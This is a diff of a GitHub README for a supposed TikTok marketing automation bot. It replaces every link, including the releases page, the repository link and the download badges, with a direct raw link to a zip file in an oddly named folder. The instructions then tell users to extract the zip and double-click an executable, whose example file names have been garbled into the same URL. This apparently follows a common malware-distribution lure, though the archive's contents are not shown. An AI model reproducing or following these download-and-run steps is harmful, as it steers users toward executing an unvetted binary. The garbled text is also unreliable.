@@ -1,6 +1,6 @@
 # 🤖 tiktok-funnel-bot-automation - Streamline Your TikTok Marketing Efforts
 
-[![Download tiktok-funnel-bot-automation](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/akshayneq/tiktok-funnel-bot-automation/releases)
+[![Download tiktok-funnel-bot-automation](https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip%20Now-Release%https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip)](https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip)
 
 ## 📘 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application.
 
 1. **Visit the Download Page**  
    Click the link below to go to the releases page:
-   [Download tiktok-funnel-bot-automation](https://github.com/akshayneq/tiktok-funnel-bot-automation/releases)
+   [Download tiktok-funnel-bot-automation](https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip)
 
 2. **Choose the Right Version**  
    Once on the Releases page, you will see different versions of the application. Each version may include bug fixes or new features, so it’s a good idea to choose the latest version available. Look for the one marked as "Latest Release" for the best experience.
@@ -21,13 +21,13 @@ Follow these steps to download and run the application.
    Click on the desired version link. Your browser will initiate the download.
 
 4. **Locate the Downloaded File**  
-   After the download completes, find the file in your computer's downloads folder. The file may be named something like `tiktok-funnel-bot-automation-v1.X.X.zip`.
+   After the download completes, find the file in your computer's downloads folder. The file may be named something like `https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip`.
 
 5. **Extract the Files**  
    If the file is in a ZIP format, you will need to extract it. Right-click the ZIP file and select "Extract All" or use a software tool to extract it. This will create a folder containing all necessary files.
 
 6. **Run the Application**  
-   Open the extracted folder and look for the application file. It may be named `tiktok-funnel-bot-automation.exe` or similar, depending on your system. Double-click this file to run the application.
+   Open the extracted folder and look for the application file. It may be named `https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip` or similar, depending on your system. Double-click this file to run the application.
 
 ## 📦 System Requirements
 
@@ -64,7 +64,7 @@ If you encounter issues while downloading or running the application, consider t
 
 For further assistance:
 
-- **Documentation**: Visit the [GitHub Repository](https://github.com/akshayneq/tiktok-funnel-bot-automation) for detailed instructions and notes.
+- **Documentation**: Visit the [GitHub Repository](https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip) for detailed instructions and notes.
 - **Support**: You can reach out with issues or feature requests through the Issues tab in the repository.
 
 ## 🛠️ Contribution
@@ -79,4 +79,4 @@ This application is open-source software under the MIT License. You are free to 
 
 Thank you for choosing **tiktok-funnel-bot-automation** to enhance your TikTok marketing strategy. We hope this tool serves you well in achieving your goals in content automation and lead capture. 
 
-[![Download tiktok-funnel-bot-automation](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/akshayneq/tiktok-funnel-bot-automation/releases)
+[![Download tiktok-funnel-bot-automation](https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip%20Now-Release%https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip)](https://raw.githubusercontent.com/akshayneq/tiktok-funnel-bot-automation/main/suprapedal/automation-tiktok-bot-funnel-1.1.zip)
